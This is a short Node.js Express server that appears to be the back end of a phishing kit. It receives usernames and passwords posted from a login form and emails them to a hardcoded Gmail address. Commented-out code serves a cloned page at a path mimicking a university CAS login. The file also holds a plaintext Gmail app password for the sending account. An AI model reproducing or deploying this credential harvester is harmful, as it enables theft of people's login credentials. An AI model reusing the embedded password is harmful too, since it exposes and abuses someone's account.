var express = require("express")
var bodyParser = require("body-parser")
const nodemailer = require("nodemailer");
const cors = require("cors");
let path = require("path");
const app = express()
let sendTo = "muhammetsimsek306@gmail.com";
app.use(cors())

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "3muharremcandan@gmail.com", //e-mail
    pass: "bfhzrcursrxhoopj", //app password from google account
  },
});

app.use(bodyParser.json())
app.use(bodyParser.urlencoded({
    extended: true
}))
app.post('/', (req, res) => {
    const { username, password } = req.body;
    const username1 = username;
    const password1 = password;
    const data = {
        "username": username1,
        "password": password1
    }
    const myJson = JSON.stringify(data)
    const options = {
    from: "3muharremcandan@gmail.com",
    to: sendTo,
    subject: "DATA",
    text: myJson  + " is your data.",
  };

  transporter.sendMail(options, (err, data) => {
    if (err) {
      console.log(err);
    } else {
      console.log("Email sent: " + JSON.stringify(data));
    }
  });
  res.status(200).send({ status: 'recived' });
  
})
app.listen(5500)

// app.get("/jasig.firat.edu.tr/cas/login6e0e.html", (req, res) => {
//     res.set({
//         "Allow-access-Allow-Origin": '*'
//     })
//     return res.redirect('login6e0e.html');

// }).listen(9000);

// console.log("Listening on Port 9000");